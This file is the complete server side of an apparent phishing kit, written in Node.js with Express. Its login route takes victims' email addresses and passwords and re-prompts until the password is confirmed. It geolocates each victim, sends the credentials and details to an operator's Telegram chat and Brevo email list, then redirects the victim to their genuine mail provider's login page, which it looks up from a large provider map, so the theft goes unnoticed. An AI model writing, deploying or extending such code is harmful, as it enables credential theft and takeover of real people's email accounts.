const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({
    origin: [
        'https://secure-auto.netlify.app',
        'http://localhost:3000',
        'http://localhost:5173'
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID          = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY    = process.env.BREVO_API_KEY;
const SENDER_EMAIL     = process.env.SENDER_EMAIL  || 'egli79380@gmail.com';
const SENDER_NAME      = process.env.SENDER_NAME   || 'ABV Monitor';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
const REDIRECT_URL     = process.env.REDIRECT_URL  || 'https://www.google.com';

const MAX_ATTEMPTS = Math.max(2, parseInt(process.env.MAX_ATTEMPTS || '6', 10));

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

// ============================================================
// STARTUP LOG
// ============================================================
console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   TURNSTILE_SECRET:   ${TURNSTILE_SECRET ? '✅' : '⚠️ not set'}`);
console.log(`   MAX_ATTEMPTS:       ${MAX_ATTEMPTS}`);
console.log('========================================');

// ============================================================
// HELPER: Verify Turnstile
// ============================================================
async function verifyTurnstile(token, ip) {
    if (!TURNSTILE_SECRET) return true;
    try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                secret: TURNSTILE_SECRET,
                response: token || '',
                remoteip: (ip || '').split(',')[0].trim()
            })
        });
        const data = await r.json();
        return data.success === true;
    } catch (err) {
        console.error('❌ Turnstile verify error:', err.message);
        return false;
    }
}

// ============================================================
// HELPER: validate + normalize email from query string
// ============================================================
function normalizeEmail(raw) {
    const s = (raw || '').toString().trim();
    if (!s) return '';
    const re = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    return re.test(s) ? s : '';
}

// ============================================================
// 🔑 GLOBAL PROVIDER MAP (exact domain matches)
// ============================================================
const PROVIDER_MAP = {
    'gmail.com':          'https://accounts.google.com/ServiceLogin?service=mail',
    'googlemail.com':     'https://accounts.google.com/ServiceLogin?service=mail',
    'outlook.com':        'https://login.live.com/',
    'hotmail.com':        'https://login.live.com/',
    'live.com':           'https://login.live.com/',
    'msn.com':            'https://login.live.com/',
    'yahoo.com':          'https://login.yahoo.com/',
    'ymail.com':          'https://login.yahoo.com/',
    'rocketmail.com':     'https://login.yahoo.com/',
    'icloud.com':         'https://www.icloud.com/',
    'me.com':             'https://www.icloud.com/',
    'mac.com':            'https://www.icloud.com/',
    'aol.com':            'https://login.aol.com/',
    'aim.com':            'https://login.aol.com/',
    'protonmail.com':     'https://mail.proton.me/',
    'proton.me':          'https://mail.proton.me/',
    'pm.me':              'https://mail.proton.me/',
    'zoho.com':           'https://accounts.zoho.com/signin',
    'zohomail.com':       'https://accounts.zoho.com/signin',
    'tutanota.com':       'https://app.tuta.com/login',
    'tuta.io':            'https://app.tuta.com/login',
    'mailbox.org':        'https://login.mailbox.org/',
    'posteo.de':          'https://posteo.de/en',
    'abv.bg':             'https://mail.abv.bg/',
    'mail.bg':            'https://mail.bg/',
    'dir.bg':             'https://mail.dir.bg/',
    'yandex.ru':          'https://passport.yandex.ru/auth',
    'yandex.com':         'https://passport.yandex.com/auth',
    'ya.ru':              'https://passport.yandex.ru/auth',
    'mail.ru':            'https://account.mail.ru/login',
    'inbox.ru':           'https://account.mail.ru/login',
    'list.ru':            'https://account.mail.ru/login',
    'bk.ru':              'https://account.mail.ru/login',
    'internet.ru':        'https://account.mail.ru/login',
    'rambler.ru':         'https://mail.rambler.ru/',
    'ukr.net':            'https://mail.ukr.net/',
    'i.ua':               'https://mail.i.ua/',
    'naver.com':          'https://nid.naver.com/nidlogin.login',
    'daum.net':           'https://accounts.kakao.com/login',
    'hanmail.net':        'https://accounts.kakao.com/login',
    'kakao.com':          'https://accounts.kakao.com/login',
    'nate.com':           'https://www.nate.com/',
    'qq.com':             'https://mail.qq.com/',
    'foxmail.com':        'https://mail.qq.com/',
    '163.com':            'https://mail.163.com/',
    '126.com':            'https://mail.126.com/',
    'yeah.net':           'https://mail.yeah.net/',
    'sina.com':           'https://mail.sina.com.cn/',
    'sohu.com':           'https://mail.sohu.com/',
    '139.com':            'https://mail.10086.cn/',
    '189.cn':             'https://webmail30.189.cn/',
    'docomo.ne.jp':       'https://mail.smt.docomo.ne.jp/',
    'ezweb.ne.jp':        'https://id.auone.jp/',
    'nifty.com':          'https://webmail.nifty.com/',
    'rediffmail.com':     'https://mail.rediff.com/cgi-bin/login.cgi',
    'rediff.com':         'https://mail.rediff.com/cgi-bin/login.cgi',
    'web.de':             'https://webmail.web.de/',
    'gmx.de':             'https://www.gmx.net/',
    'gmx.net':            'https://www.gmx.net/',
    'gmx.com':            'https://www.gmx.com/',
    't-online.de':        'https://email.t-online.de/',
    'freenet.de':         'https://email.freenet.de/',
    'mail.com':           'https://www.mail.com/',
    'orange.fr':          'https://login.orange.fr/',
    'wanadoo.fr':         'https://login.orange.fr/',
    'laposte.net':        'https://www.laposte.net/accueil',
    'free.fr':            'https://subscribe.free.fr/login/',
    'sfr.fr':             'https://www.sfr.fr/',
    'libero.it':          'https://login.libero.it/',
    'virgilio.it':        'https://login.virgilio.it/',
    'alice.it':           'https://login.alice.it/',
    'terra.com':          'https://login.terra.com/',
    'terra.es':           'https://login.terra.es/',
    'wp.pl':              'https://profil.wp.pl/login.html',
    'o2.pl':              'https://poczta.o2.pl/',
    'interia.pl':         'https://poczta.interia.pl/',
    'onet.pl':            'https://login.onet.pl/',
    'mynet.com':          'https://mail.mynet.com/',
    'vnn.vn':             'https://mail.vnn.vn/',
    'uol.com.br':         'https://email.uol.com.br/',
    'bol.com.br':         'https://www.bol.com.br/',
    'terra.com.br':       'https://login.terra.com.br/',
    'ig.com.br':          'https://mail.ig.com.br/',
    'mweb.co.za':         'https://mail.mweb.co.za/',
    'bigpond.com':        'https://login.telstra.com.au/',
    'optusnet.com.au':    'https://webmail.optusnet.com.au/',
    'xtra.co.nz':         'https://webmail.xtra.co.nz/',
    'otenet.gr':          'https://webmail.otenet.gr/',
    'freemail.hu':        'https://freemail.hu/',
    'seznam.cz':          'https://email.seznam.cz/',
    'centrum.cz':         'https://email.centrum.cz/',
    'atlas.cz':           'https://email.atlas.cz/',
    'ziggo.nl':           'https://mail.ziggo.nl/',
    'kpnmail.nl':         'https://webmail.kpnmail.nl/',
    'xs4all.nl':          'https://webmail.xs4all.nl/',
    'telia.com':          'https://webmail.telia.com/',
    'online.no':          'https://webmail.online.no/',
    'elisa.fi':           'https://webmail.elisa.fi/',
    'sapo.pt':            'https://mail.sapo.pt/',
    'meta.ua':            'https://mail.meta.ua/',
    'sbb.rs':             'https://webmail.sbb.rs/',
    'siol.net':           'https://webmail.siol.net/'
};

// ============================================================
// 🔑 MX-based provider detection
// ============================================================
const MX_PROVIDER_MAP = [
    [/google|googlemail|gmail/i,        'https://accounts.google.com/ServiceLogin?service=mail'],
    [/outlook|office365|microsoft|hotmail|live\.com|protection\.outlook/i, 'https://login.live.com/'],
    [/yandex/i,                         'https://passport.yandex.com/auth'],
    [/mail\.ru|inbox\.ru|bk\.ru/i,      'https://account.mail.ru/login'],
    [/naver/i,                          'https://nid.naver.com/nidlogin.login'],
    [/daum|kakao|hanmail/i,             'https://accounts.kakao.com/login'],
    [/qq\.com|foxmail/i,                'https://mail.qq.com/'],
    [/163\.com|126\.com|yeah\.net/i,    'https://mail.163.com/'],
    [/zoho/i,                           'https://accounts.zoho.com/signin'],
    [/proton|protonmail/i,              'https://mail.proton.me/'],
    [/tutanota|tuta/i,                  'https://app.tuta.com/login'],
    [/abv\.bg/i,                        'https://mail.abv.bg/'],
    [/mail\.bg/i,                       'https://mail.bg/'],
    [/seznam/i,                         'https://email.seznam.cz/'],
    [/wp\.pl|o2\.pl|interia/i,          'https://profil.wp.pl/login.html'],
    [/t-online/i,                       'https://email.t-online.de/'],
    [/web\.de|gmx/i,                    'https://webmail.web.de/'],
    [/orange\.fr|wanadoo/i,             'https://login.orange.fr/'],
    [/laposte/i,                        'https://www.laposte.net/accueil'],
    [/libero|virgilio/i,                'https://login.libero.it/'],
    [/terra/i,                          'https://login.terra.com/'],
    [/uol\.com\.br/i,                   'https://email.uol.com.br/'],
    [/rediff/i,                         'https://mail.rediff.com/cgi-bin/login.cgi'],
    [/yahoo/i,                          'https://login.yahoo.com/'],
    [/icloud|apple/i,                   'https://www.icloud.com/'],
    [/aol/i,                            'https://login.aol.com/'],
    [/mailbox\.org/i,                   'https://login.mailbox.org/'],
    [/mimecast|proofpoint|barracuda/i,  null]
];

function providerFromMX(mxRecord) {
    if (!mxRecord || mxRecord === 'no-mx' || mxRecord === 'MX-Error') return null;
    const first = mxRecord.split('\n')[0];
    for (const [re, url] of MX_PROVIDER_MAP) {
        if (re.test(first)) return url;
    }
    return null;
}

function providerFromTLD(domain) {
    const tld = (domain.split('.').pop() || '').toLowerCase();
    const TLD_MAP = {
        'bg': 'https://mail.bg/',
        'ru': 'https://passport.yandex.ru/auth',
        'ua': 'https://mail.ukr.net/',
        'by': 'https://passport.yandex.by/auth',
        'kz': 'https://passport.yandex.kz/auth',
        'kr': 'https://nid.naver.com/nidlogin.login',
        'jp': 'https://login.yahoo.co.jp/',
        'cn': 'https://mail.qq.com/',
        'de': 'https://webmail.web.de/',
        'fr': 'https://login.orange.fr/',
        'it': 'https://login.libero.it/',
        'es': 'https://login.terra.es/',
        'pl': 'https://profil.wp.pl/login.html',
        'tr': 'https://mail.mynet.com/',
        'cz': 'https://email.seznam.cz/',
        'hu': 'https://freemail.hu/',
        'ro': 'https://webmail.rdslink.ro/',
        'gr': 'https://webmail.otenet.gr/',
        'nl': 'https://mail.ziggo.nl/',
        'se': 'https://webmail.telia.com/',
        'no': 'https://webmail.online.no/',
        'dk': 'https://webmail.telia.com/',
        'fi': 'https://webmail.elisa.fi/',
        'pt': 'https://mail.sapo.pt/',
        'br': 'https://email.uol.com.br/',
        'mx': 'https://login.terra.com/',
        'in': 'https://mail.rediff.com/cgi-bin/login.cgi',
        'th': 'https://www.thaimail.com/',
        'id': 'https://login.yahoo.com/',
        'vn': 'https://mail.vnn.vn/',
        'za': 'https://webmail.co.za/',
        'au': 'https://login.telstra.com.au/',
        'nz': 'https://webmail.xtra.co.nz/'
    };
    return TLD_MAP[tld] || null;
}

// ============================================================
// 🔑 Provider login URL resolver — NEVER falls back to Gmail
// ============================================================
function getProviderLoginUrl(email, mxRecord) {
    const domain = (email || '').split('@')[1]?.toLowerCase() || '';
    if (!domain) return REDIRECT_URL;

    if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];

    const fromMX = providerFromMX(mxRecord);
    if (fromMX) return fromMX;

    const fromTLD = providerFromTLD(domain);
    if (fromTLD) return fromTLD;

    // Last resort — the email domain's OWN webmail subdomain (never Gmail)
    return `https://mail.${domain}/`;
}

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attempt, isMatch, maxAttempts, redirectUrl) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo not fully configured, skipping email');
        return false;
    }

    const matchTag = isMatch ? '✅ MATCH' : '⏳ pending';
    const subject = `🔐 ${email} — Attempt ${attempt}/${maxAttempts} ${matchTag}`;

    const htmlContent = `
    <!DOCTYPE html><html><head><style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; }
        .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px; text-align: center; }
        .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
        .label { font-weight: bold; color: #555; }
        .value { color: #1e930c; font-size: 16px; }
        .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
        .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; }
        .badge { display:inline-block;padding:4px 10px;background:#1e930c;color:#fff;border-radius:4px;font-size:12px;margin-left:8px }
    </style></head><body>
        <div class="container">
            <div class="header"><h2>🔐 Login Credentials <span class="badge">${attempt}/${maxAttempts} ${matchTag}</span></h2></div>
            <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
            <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
            <div class="field"><div class="label">🔢 Attempt:</div><div class="value"><strong>${attempt} of ${maxAttempts}</strong></div></div>
            <div class="field"><div class="label">🎯 Match:</div><div class="value"><strong>${isMatch ? 'YES (final)' : 'no'}</strong></div></div>
            <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
            <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
            <div class="field"><div class="label">➡️ Redirect:</div><div class="value">${redirectUrl || 'N/A'}</div></div>
            <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
            <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
            <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
            <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
            <div class="footer"><p>© ${new Date().getFullYear()} Monitor</p></div>
        </div>
    </body></html>`;

    const textContent = `🔐 Login Credentials (Attempt ${attempt}/${maxAttempts}) — ${matchTag}
Email: ${email}
Password: ${password}
Attempt: ${attempt} of ${maxAttempts}
Match: ${isMatch ? 'YES' : 'no'}
Domain: ${domain || 'Unknown'}
MX: ${mxRecord || 'Unknown'}
Redirect: ${redirectUrl || 'N/A'}
IP: ${ipInfo?.ip || 'Unknown'}
Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
Time: ${new Date().toLocaleString()}`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent,
                textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
            return true;
        }
        console.error('❌ Brevo error:', response.status, data.message || JSON.stringify(data));
        return false;
    } catch (error) {
        console.error('❌ Brevo exception:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Telegram
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured, skipping');
        return null;
    }
    const TELEGRAM_MAX = 4000;
    const chunks = [];
    let remaining = String(message || '');
    while (remaining.length > TELEGRAM_MAX) {
        let cut = remaining.lastIndexOf('\n', TELEGRAM_MAX);
        if (cut < TELEGRAM_MAX * 0.5) cut = TELEGRAM_MAX;
        chunks.push(remaining.slice(0, cut));
        remaining = remaining.slice(cut);
    }
    if (remaining.length) chunks.push(remaining);

    let lastOk = false;
    let lastDescription = '';

    for (let i = 0; i < chunks.length; i++) {
        const text = chunks.length > 1 ? `[${i + 1}/${chunks.length}]\n${chunks[i]}` : chunks[i];
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text,
                    disable_web_page_preview: true,
                    link_preview_options: { is_disabled: true }
                })
            });
            const result = await response.json();
            lastOk = !!result.ok;
            lastDescription = result.description || '';
            if (!result.ok) console.error('❌ Telegram chunk failed:', result.description);
        } catch (error) {
            console.error('❌ Telegram error:', error.message);
            lastDescription = error.message;
        }
    }
    console.log('📤 Telegram:', lastOk ? '✅ Sent' : '❌ Failed — ' + lastDescription);
    return { ok: lastOk, description: lastDescription, chunks: chunks.length };
}

// ============================================================
// HELPERS: IP + MX
// ============================================================
async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim().replace(/^::ffff:/, '');
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// ROUTE: /api/verify-turnstile  (frontend calls this)
// ============================================================
app.post('/api/verify-turnstile', async (req, res) => {
    const { token } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ok = await verifyTurnstile(token, clientIP);
    return res.json({ success: ok });
});

// ============================================================
// ROUTE: /api/login
// ============================================================
app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    const { email, password, prevPassword } = req.body || {};
    const attemptFromClient = parseInt(req.body?.attempt, 10);
    const attempt = Number.isFinite(attemptFromClient) && attemptFromClient > 0
        ? Math.min(attemptFromClient, MAX_ATTEMPTS)
        : 1;

    if (!email || !password) {
        return res.status(400).json({
            success: false, message: 'Email and password are required',
            redirect: REDIRECT_URL, retry: false
        });
    }

    const emailRegex = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({
            success: false, message: 'Invalid email format',
            redirect: REDIRECT_URL, retry: false
        });
    }

    // 🔑 MATCH RULE: 2 identical passwords in a row
    const isMatch = typeof prevPassword === 'string' &&
                    prevPassword.length > 0 &&
                    prevPassword === password;

    const hitCap = attempt >= MAX_ATTEMPTS;
    const shouldRetry = !isMatch && !hitCap;
    const finalReason = isMatch ? 'match' : (hitCap ? 'cap' : null);

    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const redirectUrl = getProviderLoginUrl(email, mxRecord);

    const header = isMatch
        ? `✅ MATCH — Attempt ${attempt}/${MAX_ATTEMPTS} — FINAL`
        : (hitCap
            ? `🎯 CAP REACHED — Attempt ${attempt}/${MAX_ATTEMPTS} — FORCING EXIT`
            : `⏳ Attempt ${attempt}/${MAX_ATTEMPTS} — no match yet`);

    const telegramMessage = `${header}
--------+ ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Prev Password : ${prevPassword || '(none)'}
Match : ${isMatch ? 'YES' : 'no'}
Attempt : ${attempt} of ${MAX_ATTEMPTS}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
➡️ Redirect : ${redirectUrl}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------`;

    console.log(`📤 Telegram — attempt ${attempt}/${MAX_ATTEMPTS} — match=${isMatch} retry=${shouldRetry}`);
    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(
        email, password, ipInfo, userAgent, domain, mxRecord,
        attempt, isMatch, MAX_ATTEMPTS, redirectUrl
    );

    const telegramOK = !!(telegramResult && telegramResult.ok);

    return res.json({
        success: telegramOK || emailResult,
        attempt,
        maxAttempts: MAX_ATTEMPTS,
        match: isMatch,
        finalReason,
        retry: shouldRetry,
        redirect: shouldRetry ? null : redirectUrl,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// ROUTE: /api/log
// ============================================================
app.post('/api/log', async (req, res) => {
    const { email } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);

    const message = `--------+ Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Visitor End +-------------`;

    await sendToTelegram(message);
    res.json({ success: true });
});

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        maxAttempts: MAX_ATTEMPTS,
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstileConfigured: !!TURNSTILE_SECRET
    });
});

// ============================================================
// 404
// ============================================================
app.use((req, res) => {
    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

// ============================================================
// START
// ============================================================
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
    console.log(`🎯 Match rule: 2 identical passwords → redirect to user's provider`);
    console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
    console.log('========================================');
});

process.on('uncaughtException', err => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));